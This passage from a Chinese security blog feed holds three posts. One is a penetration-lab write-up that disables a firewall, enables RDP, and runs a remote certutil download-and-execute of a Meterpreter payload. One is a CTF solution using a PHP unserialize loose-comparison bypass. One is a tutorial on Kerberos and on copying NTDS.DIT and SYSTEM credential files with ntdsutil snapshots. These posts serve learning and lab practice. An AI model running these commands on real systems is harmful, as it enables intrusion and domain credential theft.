永恒之蓝</p></blockquote><p>失败，不能直接获得session</p></li><li><p>尝试利用389</p><p>发现只用用于提升权限</p></li><li><p>发现已经没有可以利用的端口了</p><p>尝试开启3389端口</p><p>在这尝试关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-built_in">set</span> COMMAND netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123202539606.png" alt="image-20240123202539606"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123202527516.png" alt="image-20240123202527516"></p><p>尝试连接</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span> /v PortNumber /t REG_DWORD /d 3389 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber /t REG_DWORD /d 3389 /f</span><br><br>net start termservice<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123203902941.png" alt="image-20240123203902941"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123204525402.png" alt="image-20240123204525402"></p><p>怎么样都不能连接</p></li><li><p>psexec.exe </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240124003258274.png" alt="image-20240124003258274"></p><p>发现并不能来连接的上</p></li><li><p>cscript.exe vmiexec.vbs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe c:\<span class="hljs-built_in">test</span>\phpStudy\WWW\wmiexec.vbs /cmd 192.168.52.138 administrator PASSWD <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240124003523550.png" alt="image-20240124003523550"></p><p>成功执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cscript.exe c:\test\phpStudy\WWW\wmiexec.vbs <span class="hljs-regexp">/cmd 192.168.52.138 administrator passwd &quot;certutil.exe -urlcache -split -f http:/</span><span class="hljs-regexp">/192.168.52.143/</span>w_64_6666_bind_tcp.exe&amp;w_64_6666_bind_tcp.exe<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240124011134442.png" alt="image-20240124011134442"></p><p>然后我们主动连接一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br>show options<br><span class="hljs-built_in">set</span> lport 6767 <span class="hljs-comment">#payload 指定的端口</span><br><span class="hljs-built_in">set</span> rhost 192.168.52.138<br>run<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240124011307776.png" alt="image-20240124011307776"></p><p>成功上线</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>序列化</title>
    <link href="/2024/01/15/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/01/15/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h2><p><strong>0x00</strong> </p><p>这道题知道了原理还是很简单的，值得学习的地方是反序列化和序列化</p><p><strong>0x01</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$username</span>  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br><span class="hljs-variable">$password</span>  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-comment">//here I changed those two </span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br><span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先看源码，可以发现我们只需要对应的相等就可以，但是但是这里说已经将值改了，所以这里是不是很好猜<br>但是看到<code>==</code>若比较，那就好办了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/cb85dcd8c40ee5746df667d147a1887e.png" alt="image-20230711100710061"></p><p>我们只要将值变成true就可以了</p><blockquote><p>?info&#x3D;a:2:{s:8:”username”;b:1;s:8:”password”;b:1;}</p></blockquote><p>可以尝试使用代码生成</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115185429391.png" alt="image-20240115185429391"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-literal">true</span>,<br>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域环境密码凭证获取</title>
    <link href="/2024/01/15/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
    <url>/2024/01/15/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="windwos域认证"><a href="#windwos域认证" class="headerlink" title="windwos域认证"></a>windwos域认证</h1><p>包括三个方面</p><blockquote><p>本地认证：用户直接操作计算机登录账户<br>网络认证：远程连接到工作组中的某个设备<br>域认证：登陆到域环境中的某个设备  </p></blockquote><p>域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构  KDC（主要是域控） 的参与 </p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><blockquote><p> 活动目录：Active Diretory，AD，是指域环境中提供目录服务的组件。目录用于存储有关网络对象(例  如用户、组、共享资源计算机、、打印机和联系人等)的信息。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。</p></blockquote><p>活动目录主要的功能：  </p><blockquote><p>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的执行命令和管理密码等。<br>软件集中管理：能够统一推送软件，安装网络打印机等服务器<br>环境集中管理：统一客户端桌面、IE等<br>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码  策略。<br>更加的可靠更短的宕机时间  </p></blockquote><h2 id="Kerberos协议简介"><a href="#Kerberos协议简介" class="headerlink" title="Kerberos协议简介"></a>Kerberos协议简介</h2><blockquote><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机&#x2F;服务器 应用程序提供强大的  认证服务。<br>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。<br> 在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密  钥)执行认证服务的。  </p></blockquote><h2 id="参与域认证的三个角色"><a href="#参与域认证的三个角色" class="headerlink" title="参与域认证的三个角色"></a>参与域认证的三个角色</h2><ul><li><p>访问服务的client</p></li><li><p>提供服务的server</p></li><li><p>KDC密钥分发中心</p><p>在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p></li></ul><h2 id="Kerberos认证协议基础"><a href="#Kerberos认证协议基础" class="headerlink" title="Kerberos认证协议基础"></a>Kerberos认证协议基础</h2><ul><li>票据(Ticket)</li></ul><p>  是网络对象互相访问的凭证。  </p><ul><li><p>AD(Account Database)</p><p>存储域中所有用户的用户名和对应的 NTLM Hash，可以理解为域中的SAM数据库，KDC 可以从AD中  提取域中所有用户的 NTLM Hash，这是Kerberos 协议能够成功实现的基础。  </p><p>这个ad不一样，这个是数据库，存储了所有用户的hash</p></li><li><p>KDC(Key Distribution Center)</p><p>密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS  和 TGS  </p><p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+  AS（Authenication Service）+ TGS（Ticket Granting Service）  </p><p>关系的等于，不是数字的等于。这个的意思就是说kdc就是域控</p><p>从物理层面看，AD 与 AS，TGS，KDC均为域控制器(Domain Controller)  </p></li><li><p>AS(Authentication Server)</p></li></ul><p>  身份认证服务，为 Client 生成 TGT 的服务，也用来完成对 Client 的身份验证  </p><ul><li><p>TGS(Ticket Granting Server)</p><p>票据授予服务,为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来  TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访  问对应的服务，该服务提供的票据也称为 TGS 或者叫<strong>白银票据</strong>  </p></li><li><p>TGT(Ticket Granting  Ticket)</p></li></ul><p>  看英文名就知道，用来生成 Ticket 的 Ticket，由身份认证服务授予的票据(黄金票据)，用于身份认  证，存储在内存，默认有效期为10小时  </p><p>  注意：  </p><p>  Client 密钥、TGS 密钥 和 Service 密钥 均为对应用户的 NTLM Hash  TGS密钥 &#x3D;&#x3D; KDC  Hash &#x3D;&#x3D; krbtgt 用户的 NTLM Hash  Server 和 Service 可以当作一个东西，就是 Client 想要访问的服务器或者服务  </p><p>  Client&#x2F;(TGS&#x2F;Server)  Sessionkey 可以看作客户端与 TGS 服务和尝试登陆的 Server 之间会话时  用来加密的密钥，而(Client&#x2F;TGS&#x2F;Service) 密钥(上面提到的三个实际为 NTLM Hash 的密钥)是用  来加密会话密钥的密钥，为了保证会话密钥的传输安全，这些加密方式均为对称加密  </p><p>  参与认证的三个角色的 NTLM Hash 是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥  Sessionkey 的安全传输  </p><h2 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h2><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是  否是可信赖的，也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。  </p><p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候  通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）  </p><p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，  如果要访问其他Server需要向KDC重新申请。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102113692.png" alt="image-20240121102113692"></p><h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102209699.png" alt="image-20240121102209699"></p><p>用户输入密码进行NTLM Hash之后作为client的密钥</p><h2 id="请求身份认证"><a href="#请求身份认证" class="headerlink" title="请求身份认证"></a>请求身份认证</h2><p>客户端向AS(身份认证服务)发送认证请求  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102442135.png" alt="image-20240121102442135"></p><p>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息  (这个时候还没有发送密码，密钥)</p><p>  AS确认Client端登录者用户身份  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102545161.png" alt="image-20240121102545161"></p><ol><li><p>AS收到用户认证请求之后，根据请求中的 用户名 信息，从数据库中查找该用户名是否存在。  </p></li><li><p>如果 用户名 存在，则根据该用户名提取 NTLM  Hash 做为AS生成的CLIENT 密钥，如果第1步中用户 提供的 密码 信息正确，该秘钥与用户登录中的 CLIENT密钥 是相等的。  </p></li><li><p>AS为Client响应如下消息：</p></li></ol><ul><li>Msg A 使用 KDC 生成的 CLIENT密钥 加密的 CLIENT&#x2F;TGS  SESSIONKEY  </li><li>Msg B 使用 TGS 密钥 加密的 TGT(TICKET-GRANTING-TICKET)，客户端没有 KDC NTLM Hash 因此 Client 无法解密 TGT 。  TGT中包含如下信息：  [Client&#x2F;TGS SessionKey]  Client ID  </li><li>Ticket有效时间  </li><li>CLient 地址</li></ul><ol start="4"><li>Client收到AS的响应消息以后，利用自身的 CLIENT 密钥 可以对 Msg A进行解密，这样可以获取到  CLIENT&#x2F;TGS SESSIONKEY 。但由于Msg B是使用 TGS 密钥 加密的，Client 无法对其解密。</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110111750.png" alt="image-20240121110111750"></p><blockquote><p>  AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。  Client&#x2F;TGS SessionKey 出现了两个Copy，一个给Client端，一个给TGS端。  认证过程中的加密除哈希外均采用的是对称加密算法。  </p></blockquote><h2 id="请求服务授权"><a href="#请求服务授权" class="headerlink" title="请求服务授权"></a>请求服务授权</h2><p>  客户端向TGS发送请求服务授权请求  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110141817.png" alt="image-20240121110141817"></p><p>  客户端发送的请求中包含如下两个消息：  </p><p>Msg C  要请求的服务ID, 即 [Service ID]  上一步2.2中由AS为 Client 提供的TGT。  </p><p>Msg D  使用 CLIENT&#x2F;TGS SESSIONKEY 加密的 Authenticator 1 {Client ID, Timestamp}。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110241407.png" alt="image-20240121110241407"></p><p>  KDC接收到TGT与其他内容后，会首先使用KDC 的 NTLM  Hash解密TGT，只有KDC可以解密TGT，从  TGT中提取到 CLIENT&#x2F;TGS SESSIONKEY ，再使用 CLIENT&#x2F;TGS SESSIONKEY 解密Authenticator  1，获取到 {Client ID, Timestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对  比  </p><p>  TGS为Client响应服务授权票据  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110335963.png" alt="image-20240121110335963"></p><h1 id="活动目录数据库"><a href="#活动目录数据库" class="headerlink" title="活动目录数据库"></a>活动目录数据库</h1><p>  Active Directory 域服务AD DS 数据存储：  </p><ul><li>由 NTDS.DIT 文件构成，是Active Directory的核心  </li><li>默认存储在域控的 %SystemRoot%\ntds\ 文件夹下  </li><li><strong>只能通过域控制器进程和协议访问</strong></li></ul><blockquote><p>  活动目录数据库 NTDS.DIT：NTDS.DIT是主要的AD数据库，包括有关域用户，组和组成员身份的信  息。它还包括域中所有用户的密码哈希值。</p></blockquote><p>这个文件对于内网渗透来说非常非常的重要</p><p>在工作组环境中，<strong>SAM</strong>文件存储着当前主机用户的密码哈希值  </p><p>在域环境中，<strong>NTDS.DIT</strong>文件存储了域中所有用户的密码哈希值  </p><p>如果有这两个文件我们就可以获取到存储的密码的hash值</p><p> Windows系统为了进一步保护存储的密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密。</p><p>因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件</p><blockquote><p>NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit（C:\Windows\NTDS\NTDS.dit）  </p><p>SYSTEM文件位置： %SystemRoot%\System32\config\SYSTEM（C:\Windows\System32\config\SYSTEM  ）  </p><p>SAM文件位置：  %SystemRoot%\System32\config\SAM（C:\Windows\System32\config\SAM）</p></blockquote><p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用，所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取。</p><h1 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h1><blockquote><p>Volume Shadow Copy Service 卷影复制服务（VSS）是微软从 Windows XP 开始提供的用于创建  一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件  都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。  </p></blockquote><ul><li><p>这个微软提供的服务可以解除NTDS.DIT一直占用的状态，然后将其以生成快照的方式获取到</p></li><li><p>用于数据备份  支持 Windows Server 2003 及以上操作系统  </p></li><li><p>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备 份，该时间无法确定 </p></li><li><p>禁用 VSS 会影响系统正常使用，如 System Restore 和 Windows Server Backup  </p><p>我们可以利用 Volume  Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本。  </p><p>注意：</p></li></ul><ol><li>调用 Volume  Shadow Copy 服务会产生SYSTEM日志，Event ID 为7036。  </li><li>执行 ntdsutil  snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li></ol><h1 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h1><blockquote><p>Ntdsutil.exe 是一个命令行工具，它为 Active Directory 域服务 (AD DS) 和 Active  Directory轻型目录服务 (AD LDS) 提供管理工具。您可以使用ntdsutil命令执行 AD DS 的数据库维  护，管理和控制单个主机操作，并删除域控制器留下的元数据，这些域控制器在未正确卸载的情况下  从网络中删除 </p><p>域环境默认安装，要使用 Ntdsutil.exe，必须从管理员命令提示符运行  </p><p>如果安装了 AD  LDS 服务器角色但未安装 AD DS 服务器角色，则可以使用 dsdbutil.exe 和  dsmgmt.exe 命令行工具来执行可以使用 ntdsutil.exe 执行的相同任务。  </p></blockquote><p>创建快照 ，从而获取到NTDS.DIT的备份</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>使用管理员打开cmd，必须是cmd，powershell无法完成</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># 进入ntdsutil命令行</span><br>ntdsutil<br><br><span class="hljs-comment"># 进入快照</span><br>snapshot<br><br><span class="hljs-comment"># 激活 AD DS 实例</span><br>activate<span class="hljs-built_in"> instance </span>ntds<br><br>create<br>mount [GUID]<br>copy C:\$SNAP_202205161140_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit<br><br><span class="hljs-comment"># copy 完之后再执行</span><br>unmount [GUID]<br>del [GUID]<br></code></pre></td></tr></table></figure><p>然后就可以目录访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115816244.png" alt="image-20240121115816244"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115859064.png" alt="image-20240121115859064"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121120139033.png" alt="image-20240121120139033"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>在进入ntdsutil之后</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#激活 AD DS 实例</span><br>activate<span class="hljs-built_in"> instance </span>ntds<br><br><span class="hljs-comment">#为可写（full）和只读域控制器 (RODC) 和 AD LDS 实例创建安装介质。</span><br>ifm<br><br><span class="hljs-comment">#为可写 Active Directory 域控制器或 AD LDS 实例创建安装介质到指定文件夹中</span><br>create full &lt;Drive&gt;:\&lt;Folder&gt;<br></code></pre></td></tr></table></figure><h3 id="方法三-非交互式"><a href="#方法三-非交互式" class="headerlink" title="方法三(非交互式)"></a>方法三(非交互式)</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;mount &#123;GUID&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit<br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;GUID&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;GUID&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p> 查询当前系统的快照  </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;List All&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;List Mounted&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p>创建快照</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p>挂载快照</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p>复制ntds.dit</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">copy C:\<span class="hljs-symbol">$</span>SNAP_202008271744_VOLUMEC<span class="hljs-symbol">$</span>\windows\NTDS\ntds.dit c:\ntds2.dit<br>copy C:\<span class="hljs-symbol">$</span>SNAP_202008271744_VOLUMEC<span class="hljs-symbol">$</span>\windows\system32\config\<span class="hljs-keyword">SYSTEM</span> c:\<span class="hljs-keyword">SYSTEM</span><br></code></pre></td></tr></table></figure><p>卸载快照</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span 